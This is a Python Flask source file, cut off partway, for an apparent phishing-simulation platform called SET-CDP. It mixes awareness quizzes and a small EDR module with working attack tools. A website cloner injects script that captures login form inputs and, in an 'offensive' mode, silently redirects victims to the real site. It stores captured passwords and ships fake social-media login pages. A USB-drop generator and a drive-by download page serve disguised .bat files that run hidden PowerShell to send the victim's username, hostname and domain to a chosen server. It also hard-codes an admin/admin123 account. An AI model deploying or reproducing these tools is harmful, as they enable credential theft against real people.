from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash, send_from_directory
import os, re, ssl, socket, sqlite3, json, hashlib, ipaddress, uuid, secrets, string, math, zipfile
from datetime import datetime
from urllib.parse import urlparse
from io import BytesIO
import requests
from bs4 import BeautifulSoup
from PIL import Image, ExifTags
from pypdf import PdfReader
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
import qrcode
import base64
from flask import send_file, abort
import psutil
import platform
import time
import mimetypes
from flask import render_template_string

# ==================== CONFIGURATION ====================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'database.db')

app = Flask(__name__)
app.secret_key = 'set-cdp-local-training-secret'
app.config['MAX_CONTENT_LENGTH'] = 25 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = os.path.join(BASE_DIR, 'uploads')
app.config['CLONES_FOLDER'] = os.path.join(BASE_DIR, 'templates', 'clones')

for p in [app.config['UPLOAD_FOLDER'], app.config['CLONES_FOLDER']]:
    os.makedirs(p, exist_ok=True)

SECURITY_HEADERS = {
    'Strict-Transport-Security': 'HSTS forces HTTPS connections',
    'Content-Security-Policy': 'CSP helps prevent XSS and injection',
    'X-Frame-Options': 'Protects against clickjacking',
    'X-Content-Type-Options': 'Prevents MIME sniffing',
    'Referrer-Policy': 'Controls referrer leakage',
    'Permissions-Policy': 'Restricts browser features'
}
COMMON_PASSWORDS = {'123456','123456789','password','admin','qwerty','111111','123123','abc123','password123','admin123','letmein','welcome'}
PHISHING_KEYWORDS = ['urgent','verify','account suspended','password expired','click here','limited time','winner','prize','gift card','confirm your account','security alert','update your information','login now','تأكيد','عاجل','كلمة المرور','حسابك']

QUIZ_QUESTIONS = [
    {"id": 1, "q": "What is phishing?", "a": ["Fake login attack", "Strong password", "Firewall", "Backup"], "correct": 0},
    {"id": 2, "q": "Which header helps prevent XSS?", "a": ["CSP", "DNS", "FTP", "SMTP"], "correct": 0},
    {"id": 3, "q": "What does SSL/TLS protect?", "a": ["Connection encryption", "Screen size", "CPU", "Images"], "correct": 0},
    {"id": 4, "q": "Best protection for accounts?", "a": ["MFA", "Weak password", "Reuse password", "Ignore updates"], "correct": 0},
    {"id": 5, "q": "What is ransomware?", "a": ["Encrypts files for ransom", "Speeds internet", "Cleans metadata", "Design tool"], "correct": 0},
    {"id": 6, "q": "A suspicious short link should be?", "a": ["Expanded and checked", "Clicked quickly", "Shared", "Ignored always"], "correct": 0},
    {"id": 7, "q": "X-Frame-Options protects against?", "a": ["Clickjacking", "Malware", "Spam", "Backup loss"], "correct": 0},
    {"id": 8, "q": "Password manager helps because?", "a": ["Detects fake domains", "Deletes files", "Changes IP", "Blocks CSS"], "correct": 0},
    {"id": 9, "q": "HTTP without S means?", "a": ["Not encrypted", "More secure", "Always safe", "No website"], "correct": 0},
    {"id": 10, "q": "Security awareness means?", "a": ["Knowing risks and safe behavior", "Only coding", "Only design", "Only hardware"], "correct": 0}
]

EXTENSIONS_DIR = os.path.join(BASE_DIR, "static", "extensions")

EXTENSION_FILES = {
    "webshield": "webshield.zip",
    "cookieshield": "SET-CDP-CookieShield-Pro-v1.0.zip",
    "adshield": "SET-CDP-AdShield-Pro-v1.0.zip",
    "todo": "Advanced-To-Do-List-main.zip",
    "webshield-v2": "SET-CDP-WebShield-Pro-v2.zip"
}

# ==================== MINI-EDR CONFIGURATION ====================
EDR_SUSPICIOUS_PORTS = {
    21, 22, 23, 25, 53, 110, 135, 139, 445, 1433, 1521,
    3306, 3389, 4444, 5555, 5900, 6666, 7777, 8080, 8443, 31337
}

EDR_CRITICAL_PROCESS_NAMES = {
    "system", "registry", "smss.exe", "csrss.exe", "wininit.exe",
    "services.exe", "lsass.exe", "svchost.exe", "explorer.exe",
    "dwm.exe", "spoolsv.exe", "python.exe", "pythonw.exe"
}

@app.route("/download-extension/<extension_key>")
def download_extension(extension_key):
    filename = EXTENSION_FILES.get(extension_key)

    if not filename:
        abort(404)

    file_path = os.path.join(EXTENSIONS_DIR, filename)

    if not os.path.isfile(file_path):
        return {
            "error": "File not found",
            "expected_path": file_path,
            "available_files": os.listdir(EXTENSIONS_DIR) if os.path.exists(EXTENSIONS_DIR) else []
        }, 404

    return send_file(
        file_path,
        as_attachment=True,
        download_name=filename,
        mimetype="application/zip"
    )

# ==================== SECURITY DECORATORS ====================

def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if "user_id" not in session:
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return wrapper

def admin_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if "user_id" not in session:
            return redirect(url_for("login"))
        if session.get("role") != "admin":
            return render_template("403.html"), 403
        return f(*args, **kwargs)
    return wrapper

# ==================== DATABASE FUNCTIONS ====================

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()

    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password_hash TEXT,
        role TEXT DEFAULT 'user',
        full_name TEXT,
        profile_image TEXT,
        bio TEXT,
        created_at TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS captured_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        target_site TEXT,
        captured_username TEXT,
        captured_password TEXT,
        password_status TEXT DEFAULT 'Password Captured',
        full_data TEXT,
        ip_address TEXT,
        user_agent TEXT,
        timestamp TEXT,
        user_id INTEGER
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS clones (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        clone_name TEXT UNIQUE,
        source_url TEXT,
        template_file TEXT,
        created_at TEXT,
        user_id INTEGER
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS scan_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        scan_type TEXT,
        target TEXT,
        result_summary TEXT,
        risk_level TEXT,
        timestamp TEXT,
        user_id INTEGER
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS cyber_threats (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        risk TEXT NOT NULL,
        desc TEXT NOT NULL,
        how TEXT NOT NULL,
        prev TEXT NOT NULL,
        is_published INTEGER DEFAULT 1,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        updated_at TEXT DEFAULT CURRENT_TIMESTAMP
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS edr_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_type TEXT NOT NULL,
        severity TEXT NOT NULL,
        title TEXT NOT NULL,
        details TEXT,
        pid INTEGER,
        process_name TEXT,
        local_address TEXT,
        remote_address TEXT,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS edr_agents (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT UNIQUE NOT NULL,
        hostname TEXT,
        username TEXT,
        os_name TEXT,
        local_ip TEXT,
        cpu_percent REAL,
        ram_percent REAL,
        processes_data TEXT,
        connections_data TEXT,
        status TEXT DEFAULT 'Online',
        last_seen TEXT,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )''')

    conn.commit()
    conn.close()

def migrate_db():
    conn = get_db()
    c = conn.cursor()
    tables_cols = {
        "captured_data": {
            "captured_password": "TEXT",
            "password_status": "TEXT DEFAULT 'Password Captured'",
            "captured_email": "TEXT",
            "full_data": "TEXT",
            "user_agent": "TEXT",
            "user_id": "INTEGER"
        },
        "clones": {
            "source_url": "TEXT DEFAULT ''",
            "template_file": "TEXT DEFAULT ''",
            "created_at": "TEXT DEFAULT ''",
            "user_id": "INTEGER"
        },
        "users": {
            "full_name": "TEXT",
            "profile_image": "TEXT",
            "bio": "TEXT"
        },
        "quiz_results": {
            "user_id": "INTEGER"
        },
        "scan_history": {
            "user_id": "INTEGER"
        }
    }
    for table, columns in tables_cols.items():
        try:
            existing = [r[1] for r in c.execute(f"PRAGMA table_info({table})").fetchall()]
            for col, ddl in columns.items():
                if col not in existing:
                    c.execute(f"ALTER TABLE {table} ADD COLUMN {col} {ddl}")
        except Exception:
            pass
    conn.commit()
    conn.close()

def ensure_quiz_table():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS quiz_results (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        student_name TEXT,
        score INTEGER,
        total INTEGER,
        percentage INTEGER,
        status TEXT,
        timestamp TEXT,
        user_id INTEGER
    )''')
    conn.commit()
    conn.close()

def ensure_quiz_questions_table():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS quiz_questions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        question TEXT,
        option_a TEXT,
        option_b TEXT,
        option_c TEXT,
        option_d TEXT,
        correct_option INTEGER,
        is_active INTEGER DEFAULT 1,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

def create_default_admin():
    conn = get_db()
    admin = conn.execute("SELECT * FROM users WHERE username = ?", ("admin",)).fetchone()
    if not admin:
        conn.execute(
            "INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
            ("admin", generate_password_hash("admin123"), "admin", now())
        )
        conn.commit()
    conn.close()

# ==================== HELPERS ====================

def now(): return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def mask_ip(ip):
    if not ip: return 'unknown'
    return ip  # الإظهار الكامل كما اتفقنا سابقاً

def normalize_url(url):
    url = (url or '').strip()
    if not url.startswith(('http://','https://')): url='https://'+url
    return url

def safe_name(name):
    s = re.sub(r'[^A-Za-z0-9_-]+','_', (name or '').strip())[:50]
    return s or 'training_clone'

def is_safe_hostname(hostname):
    if not hostname: return False, 'Invalid hostname'
    if hostname in ['localhost','127.0.0.1','::1']: return False, 'Localhost blocked'
    try:
        ip = ipaddress.ip_address(hostname)
        if ip.is_private or ip.is_loopback: return False, 'Private IP blocked'
    except ValueError: pass
    return True, 'OK'

def log_scan(scan_type, target, summary, level):
    user_id = session.get("user_id")
    conn = get_db()
    conn.execute(
        '''INSERT INTO scan_history (scan_type, target, result_summary, risk_level, timestamp, user_id) VALUES (?, ?, ?, ?, ?, ?)''',
        (scan_type, target, summary, level, now(), user_id)
    )
    conn.commit()
    conn.close()


def get_dashboard_counts():
    """
    نفس أرقام لوحة التحكم:
    - الأدمن يرى كل البيانات.
    - المستخدم العادي يرى بياناته فقط.
    - الزائر غير المسجل تظهر له الأرقام 0 لحماية الخصوصية.
    """
    user_id = session.get("user_id")
    is_admin = session.get("role") == "admin" or session.get("is_admin") is True

    stats = {
        "captures": 0,
        "training": 0,
        "clones": 0,
        "scans": 0,
        "tools": 10,
        "users": 0,
        "quiz": 0
    }

    if not user_id:
        return stats

    conn = get_db()
    try:
        if is_admin:
            stats["captures"] = conn.execute("SELECT COUNT(*) FROM captured_data").fetchone()[0]
            stats["clones"] = conn.execute("SELECT COUNT(*) FROM clones").fetchone()[0]
            stats["scans"] = conn.execute("SELECT COUNT(*) FROM scan_history").fetchone()[0]
            stats["users"] = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            stats["quiz"] = conn.execute("SELECT COUNT(*) FROM quiz_results").fetchone()[0]
        else:
            stats["captures"] = conn.execute("SELECT COUNT(*) FROM captured_data WHERE user_id = ?", (user_id,)).fetchone()[0]
            stats["clones"] = conn.execute("SELECT COUNT(*) FROM clones WHERE user_id = ?", (user_id,)).fetchone()[0]
            stats["scans"] = conn.execute("SELECT COUNT(*) FROM scan_history WHERE user_id = ?", (user_id,)).fetchone()[0]
            stats["quiz"] = conn.execute("SELECT COUNT(*) FROM quiz_results WHERE user_id = ?", (user_id,)).fetchone()[0]

        stats["training"] = stats["captures"]
        return stats
    finally:
        conn.close()

def password_strength(password):
    score=0; feedback=[]; p=password or ''
    if len(p)>=12: score+=2; feedback.append('✅ طول ممتاز 12+ حرف')
    elif len(p)>=8: score+=1; feedback.append('⚠️ طول مقبول، الأفضل 12+ حرف')
    else: feedback.append('❌ قصيرة جداً')
    if re.search(r'[A-Z]',p): score+=1; feedback.append('✅ تحتوي أحرف كبيرة')
    else: feedback.append('⚠️ أضف أحرف كبيرة')
    if re.search(r'[a-z]',p): score+=1; feedback.append('✅ تحتوي أحرف صغيرة')
    else: feedback.append('⚠️ أضف أحرف صغيرة')
    if re.search(r'\d',p): score+=1; feedback.append('✅ تحتوي أرقام')
    else: feedback.append('⚠️ أضف أرقام')
    if re.search(r'[^A-Za-z0-9]',p): score+=1; feedback.append('✅ تحتوي رموز')
    else: feedback.append('⚠️ أضف رموز')
    if p.lower() in COMMON_PASSWORDS: score=max(0,score-2); feedback.append('❌ كلمة شائعة جداً')
    pct=min(100,int(score/6*100))
    strength='Strong' if pct>=80 else 'Medium' if pct>=50 else 'Weak'
    return {'score':pct,'strength':strength,'feedback':feedback}

# ==================== MINI-EDR HELPERS ====================

def is_public_ip(ip):
    try:
        parsed = ipaddress.ip_address(ip)
        return not (
            parsed.is_private or
            parsed.is_loopback or
            parsed.is_link_local or
            parsed.is_multicast or
            parsed.is_reserved
        )
    except Exception:
        return False

def log_edr_event(event_type, severity, title, details="", pid=None, process_name=None, local_address=None, remote_address=None):
    conn = get_db()
    conn.execute("""
        INSERT INTO edr_events 
        (event_type, severity, title, details, pid, process_name, local_address, remote_address)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (event_type, severity, title, details, pid, process_name, local_address, remote_address))
    conn.commit()
    conn.close()

def send_telegram_edr_alert(title, details):
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    if not token or not chat_id:
        return False
    try:
        message = f"🚨 SET-CDP Mini-EDR Alert\n\n{title}\n\n{details}"
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        requests.post(url, data={"chat_id": chat_id, "text": message}, timeout=5)
        return True
    except Exception:
        return False

def get_process_risk(proc_info):
    score = 0
    reasons = []
    name = (proc_info.get("name") or "").lower()
    cpu = proc_info.get("cpu_percent") or 0
    mem = proc_info.get("memory_percent") or 0
    exe = proc_info.get("exe") or ""
    
    suspicious_names = ["miner", "crypt", "payload", "backdoor", "rat", "keylogger", "inject", "unknown"]
    
    if cpu >= 80:
        score += 25
        reasons.append("High CPU usage")
    if mem >= 25:
        score += 20
        reasons.append("High memory usage")
    if any(word in name for word in suspicious_names):
        score += 35
        reasons.append("Suspicious process name")
    if exe and ("temp" in exe.lower() or "appdata" in exe.lower()):
        score += 20
        reasons.append("Running from temporary/user directory")
        
    level = "High" if score >= 70 else "Medium" if score >= 40 else "Low" if score >= 20 else "Normal"
    return {"score": min(score, 100), "level": level, "reasons": reasons}

def get_connection_risk(conn_data):
    score = 0
    reasons = []
    remote_ip = conn_data.get("remote_ip")
    remote_port = conn_data.get("remote_port")
    status = conn_data.get("status")
    
    if remote_ip and is_public_ip(remote_ip):
        score += 30
        reasons.append("External public connection")
    if remote_port in EDR_SUSPICIOUS_PORTS:
        score += 25
        reasons.append(f"Sensitive/suspicious port: {remote_port}")
    if status == "ESTABLISHED" and remote_ip and is_public_ip(remote_ip):
        score += 15
        reasons.append("Established external session")
        
    level = "High" if score >= 70 else "Medium" if score >= 40 else "Low" if score >= 20 else "Normal"
    return {"score": min(score, 100), "level": level, "reasons": reasons}


# ==================== SYSTEM INITIALIZATION ====================

init_db()
migrate_db()
ensure_quiz_table()
ensure_quiz_questions_table()
create_default_admin()


# ==================== AUTHENTICATION & PROFILES ====================

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
        conn.close()

        if user and check_password_hash(user["password_hash"], password):
            session["user_id"] = user["id"]
            session["username"] = user["username"]
            session["role"] = user["role"]
            try:
                session["full_name"] = user["full_name"] or ""
            except IndexError:
                session["full_name"] = ""
            return redirect(url_for("index"))
        return render_template("login.html", error="اسم المستخدم أو كلمة المرور غير صحيحة")
    return render_template("login.html")

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        confirm_password = request.form.get("confirm_password", "")

        if not username or not password:
            return render_template("register.html", error="يرجى إدخال اسم المستخدم وكلمة المرور")

        if password != confirm_password:
            return render_template("register.html", error="كلمتا المرور غير متطابقتين")

        conn = get_db()
        existing_user = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()

        if existing_user:
            conn.close()
            return render_template("register.html", error="اسم المستخدم موجود مسبقاً")

        conn.execute(
            "INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
            (username, generate_password_hash(password), "user", now())
        )
        conn.commit()
        conn.close()

        return redirect(url_for("login"))
    return render_template("register.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

@app.route("/profile", methods=["GET", "POST"])
@login_required
def profile():
    user_id = session.get("user_id")
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()

    if request.method == "POST":
        full_name = request.form.get("full_name", "").strip()
        bio = request.form.get("bio", "").strip()
        image_name = user["profile_image"] if user and user["profile_image"] else None

        if "profile_image" in request.files:
            img = request.files["profile_image"]
            if img and img.filename:
                ext = img.filename.rsplit(".", 1)[-1].lower()
                if ext in ["jpg", "jpeg", "png", "webp"]:
                    image_name = f"user_{user_id}_{uuid.uuid4().hex[:8]}.{ext}"
                    image_path = os.path.join(app.config["UPLOAD_FOLDER"], image_name)
                    img.save(image_path)

        conn.execute(
            "UPDATE users SET full_name = ?, bio = ?, profile_image = ? WHERE id = ?",
            (full_name, bio, image_name, user_id)
        )
        conn.commit()
        session["full_name"] = full_name
        conn.close()
        return redirect(url_for("profile"))

    scans = conn.execute("SELECT * FROM scan_history WHERE user_id = ? ORDER BY id DESC LIMIT 20", (user_id,)).fetchall()
    quizzes = conn.execute("SELECT * FROM quiz_results WHERE user_id = ? ORDER BY id DESC LIMIT 20", (user_id,)).fetchall()
    captures = conn.execute("SELECT * FROM captured_data WHERE user_id = ? ORDER BY id DESC LIMIT 20", (user_id,)).fetchall()
    conn.close()

    return render_template("profile.html", user=user, scans=scans, quizzes=quizzes, captures=captures)

@app.route("/uploads/<filename>")
def uploaded_file(filename):
    return send_from_directory(app.config["UPLOAD_FOLDER"], filename)


# ==================== MAIN APPLICATION ROUTES ====================

@app.route('/')
def index():
    conn = get_db()
    user_id = session.get("user_id")
    is_admin = session.get("role") == "admin"

    scans = []
    if user_id:
        if is_admin:
            scans = conn.execute("""
                SELECT scan_history.*, users.username AS owner_username
                FROM scan_history
                LEFT JOIN users ON scan_history.user_id = users.id
                ORDER BY scan_history.id DESC LIMIT 15
            """).fetchall()
        else:
            scans = conn.execute(
                "SELECT * FROM scan_history WHERE user_id = ? ORDER BY id DESC LIMIT 15",
                (user_id,)
            ).fetchall()

    conn.close()
    stats = get_dashboard_counts()
    return render_template('index.html', scans=scans, stats=stats)

@app.route('/attack')
@login_required
def attack():
    conn=get_db()
    clones=conn.execute('SELECT * FROM clones ORDER BY id DESC').fetchall()
    conn.close()
    return render_template('attack.html', clones=clones)

@app.route('/dashboard')
@login_required
def dashboard():
    conn = get_db()
    if session.get("role") == "admin":
        captured = conn.execute("""
            SELECT 
                captured_data.*,
                users.username AS owner_username,
                users.full_name AS owner_full_name
            FROM captured_data
            LEFT JOIN users ON captured_data.user_id = users.id
            ORDER BY captured_data.id DESC
        """).fetchall()

        clones = conn.execute("""
            SELECT 
                clones.*,
                users.username AS owner_username,
                users.full_name AS owner_full_name
            FROM clones
            LEFT JOIN users ON clones.user_id = users.id
            ORDER BY clones.id DESC
        """).fetchall()

        users = conn.execute("""
            SELECT id, username, role, full_name, created_at
            FROM users
            ORDER BY id DESC
        """).fetchall()
        
        scans = conn.execute("""
            SELECT 
                scan_history.*, 
                users.username AS owner_username 
            FROM scan_history 
            LEFT JOIN users ON scan_history.user_id = users.id 
            ORDER BY scan_history.id DESC LIMIT 50
        """).fetchall()

    else:
        user_id = session.get("user_id")
        captured = conn.execute("""
            SELECT 
                captured_data.*,
                users.username AS owner_username,
                users.full_name AS owner_full_name
            FROM captured_data
            LEFT JOIN users ON captured_data.user_id = users.id
            WHERE captured_data.user_id = ?
            ORDER BY captured_data.id DESC
        """, (user_id,)).fetchall()

        clones = conn.execute("""
            SELECT 
                clones.*,
                users.username AS owner_username,
                users.full_name AS owner_full_name
            FROM clones
            LEFT JOIN users ON clones.user_id = users.id
            WHERE clones.user_id = ?
            ORDER BY clones.id DESC
        """, (user_id,)).fetchall()

        users = []
        scans = conn.execute("SELECT * FROM scan_history WHERE user_id = ? ORDER BY id DESC LIMIT 50", (user_id,)).fetchall()

    conn.close()
    return render_template('dashboard.html', captured=captured, clones=clones, users=users, scans=scans)

@app.route('/ready_templates')
@login_required
def ready_templates(): return render_template('ready_templates.html')

@app.route('/social/<name>')
def social(name):
    if name not in ['facebook','instagram','linkedin','university', 'fake_popup']: return redirect(url_for('ready_templates'))
    return render_template(f'social/{name}.html')

@app.route("/about")
def about(): return render_template("about.html")

@app.route('/awareness-training')
def awareness(): return render_template('awareness_training.html')

@app.route('/extensions')
@login_required
def extensions_page():
    return render_template('extensions.html')

# ==================== OFFENSIVE (CLONE & CAPTURE) APIs ====================

@app.route('/api/generate-qr', methods=['POST'])
@login_required
def generate_qr():
    data = request.get_json() or {}
    url = data.get('url', '').strip()
    
    if not url:
        return jsonify({'error': 'الرابط مطلوب'}), 400

    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")

        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()

        log_scan("qr_generator", url, "تم إنشاء QR Code تدريبي", "Info")

        return jsonify({
            'success': True, 
            'qr_image': f"data:image/png;base64,{img_str}"
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/generate-usb', methods=['POST'])
@login_required
def generate_usb():
    data = request.get_json() or {}
    server_url = data.get('server_url', '').strip()
    
    if not server_url:
        return jsonify({'error': 'الرابط مطلوب'}), 400

    server_url = server_url.rstrip('/')
    user_id = session.get('user_id')

    bat_content = f"""@echo off
:: SET-CDP Physical Security Training Payload
:: This file simulates an Advanced USB Drop Attack (Beacon).

set SERVER_URL={server_url}/api/capture-submit
set SITE_NAME=USB_Drop_Attack

powershell -WindowStyle Hidden -Command "$os=(Get-WmiObject Win32_OperatingSystem).Caption; $data = @{{site='%SITE_NAME%'; form_data=@{{username=$env:USERNAME; password='[USB_BEACON_EXECUTED]'; computername=$env:COMPUTERNAME; user_domain=$env:USERDOMAIN; os_version=$os; execution_path=$PWD.Path; creator_id='{user_id}'; attack_type='Physical_USB_Drop'}}}}; $json = $data | ConvertTo-Json -Depth 10; try {{ Invoke-RestMethod -Uri '%SERVER_URL%' -Method Post -Body $json -ContentType 'application/json' -UseBasicParsing }} catch {{ }}"
exit
"""
    log_scan("usb_payload_generator", server_url, "تم إنشاء ملف محاكاة USB بخصائص الاستطلاع المتقدم", "Info")
    return jsonify({'success': True, 'payload': bat_content, 'filename': 'Important_University_Documents.bat'})
# ==================== DRIVE-BY DOWNLOAD SIMULATION ====================

@app.route('/simulations/auto-download')
@login_required
def auto_download_simulation():
    """
    صفحة هبوط وهمية (Landing Page). 
    تحتوي على كود JavaScript بسيط يوجه المتصفح لتنزيل الملف تلقائياً فور فتح الصفحة.
    """
    html_content = '''
    <!DOCTYPE html>
    <html dir="rtl" lang="ar">
    <head>
        <meta charset="UTF-8">
        <title>تحديث النظام العاجل</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin-top: 15%; background-color: #f8fafc; color: #0f172a; }
            .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); display: inline-block; max-width: 500px; border-top: 4px solid #0ea5e9; }
            .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            .btn { display: inline-block; margin-top: 20px; padding: 12px 24px; background: #0f172a; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; transition: 0.2s; }
            .btn:hover { background: #0ea5e9; }
            .note { margin-top: 15px; font-size: 12px; color: #64748b; }
        </style>
    </head>
    <body>
        <div class="box">
            <div class="spinner"></div>
            <h2 style="margin:0 0 10px 0;">📥 جارٍ تنزيل التحديث الأمني...</h2>
            <p>يرجى الانتظار، سيبدأ تنزيل الملف المطلوب تلقائياً لحماية جهازك.</p>
            <a href="/api/serve-payload" class="btn" id="manual-dl">تنزيل الملف يدوياً</a>
            <p class="note">هذه الصفحة جزء من منصة SET-CDP للتدريب والمحاكاة.</p>
        </div>

        <script>
            // آلية التنزيل التلقائي (Drive-by Simulation)
            // نستخدم setTimeout لإعطاء واقعية للصفحة قبل بدء التنزيل
            setTimeout(function() {
                // توجيه المتصفح لتحميل مسار الملف المخفي
                window.location.href = "/api/serve-payload";
            }, 1500); // 1.5 ثانية
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_content)

@app.route('/api/serve-payload')
@login_required
def serve_payload():
    """
    هذا المسار يقوم بإنشاء ملف הـ Batch (Beacon) على الطاير (On-the-fly) 
    وإرساله كـ Attachment ليقوم المتصفح بتنزيله.
    """
    # الحصول على رابط السيرفر الحالي تلقائياً
    server_url = request.host_url.rstrip('/')
    user_id = session.get('user_id', 'anonymous')
    
    # محتوى الملف التدريبي (آمن، يقوم فقط بإرسال معلومات الجهاز الأساسية)
    bat_content = f"""@echo off
:: SET-CDP Drive-by Download Training Payload
:: This file simulates an auto-downloaded beacon.

set SERVER_URL={server_url}/api/capture-submit
set SITE_NAME=Auto_Download_Simulation

powershell -WindowStyle Hidden -Command "$os=(Get-WmiObject Win32_OperatingSystem).Caption; $data = @{{site='%SITE_NAME%'; form_data=@{{username=$env:USERNAME; password='[BEACON_EXECUTED]'; computername=$env:COMPUTERNAME; user_domain=$env:USERDOMAIN; os_version=$os; execution_path=$PWD.Path; creator_id='{user_id}'; attack_type='Drive_by_Download'}}}}; $json = $data | ConvertTo-Json -Depth 10; try {{ Invoke-RestMethod -Uri '%SERVER_URL%' -Method Post -Body $json -ContentType 'application/json' -UseBasicParsing }} catch {{ }}"
exit
"""
    
    # تحويل النص إلى بايتات لإرساله كملف
    file_bytes = BytesIO(bat_content.encode('utf-8'))
    
    # تسجيل العملية في النظام
    try:
        log_scan("auto_download_simulation", server_url, "تم إرسال حمولة التنزيل التلقائي للضحية", "Info")
    except Exception:
        pass

    # إرسال الملف للمتصفح ليبدأ التنزيل
    return send_file(
        file_bytes,
        as_attachment=True,
        download_name='Security_Update_v2.bat',
        mimetype='application/x-msdos-program'
    )
@app.route('/api/clone-site', methods=['POST'])
@login_required
def api_clone_site():
    data = request.get_json() or {}
    
    # 1. تم تصحيح الأسماء لتتطابق مع دوال app.py الخاص بك
    url = normalize_url(data.get('url', ''))
    name = safe_name(data.get('name') or 'clone_' + datetime.now().strftime('%Y%m%d%H%M%S'))
    
    # 2. التحقق من أمان الرابط (منع SSRF)
    parsed = urlparse(url)
    safe, msg = is_safe_hostname(parsed.hostname)
    if not safe: 
        return jsonify({'error': msg}), 400

    # 3. تحديد نمط العملية (تدريبي أم هجومي)
    mode = data.get('mode', 'educational')
    # حماية: نضمن أن الأدمن فقط هو من يمكنه استخدام الوضع الهجومي
    if mode == 'offensive' and session.get('role') != 'admin':
        mode = 'educational'

    try:
        r = requests.get(url, timeout=15, headers={'User-Agent': 'Mozilla/5.0 SET-CDP Educational Clone'}, allow_redirects=True)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, 'html.parser')
        
        if soup.head:
            base = soup.new_tag('base', href=url)
            soup.head.insert(0, base)
            meta = soup.new_tag('meta')
            meta.attrs['charset'] = 'utf-8'
            soup.head.insert(0, meta)
            
        for script in soup.find_all('script'): script.decompose()
        for form in soup.find_all('form'): 
            form['action'] = '#'
            form['onsubmit'] = 'return false;'
            
        if not soup.body: soup.append(soup.new_tag('body'))
        
        # 4. تحديد رابط التوجيه (Redirect URL) بناءً على النمط
        if mode == 'offensive':
            # توجيه للموقع الأصلي بدون أن يشعر الضحية
            redirect_js = f"var redirectUrl = '{url}';"
        else:
            # توجيه لصفحة التوعية التعليمية
            redirect_js = "var redirectUrl = window.location.origin + '/awareness-training';"

        js = soup.new_tag('script')
        js.string = f'''
        (function(){{
            function captureAndSend(e) {{
                var inputs = document.querySelectorAll('input');
                var data = {{}};
                var hasData = false;
                
                inputs.forEach(function(input) {{
                    if((input.name || input.id) && input.type !== 'hidden') {{
                        var key = input.name || input.id;
                        data[key] = input.value;
                        if(input.value.trim() !== '') hasData = true;
                    }}
                }});
                
                if(!hasData) return; 
                if(e) {{ e.preventDefault(); e.stopPropagation(); }}
                
                var siteName = "{name}";
                {redirect_js}
                
                fetch(window.location.origin + '/api/capture-submit', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{site: siteName, form_data: data}})
                }})
                .then(function(){{ window.location.href = redirectUrl; }})
                .catch(function(){{ window.location.href = redirectUrl; }});
            }}
            
            document.addEventListener('submit', function(e){{ captureAndSend(e); }}, true);
            document.addEventListener('click', function(e){{
                var t = e.target;
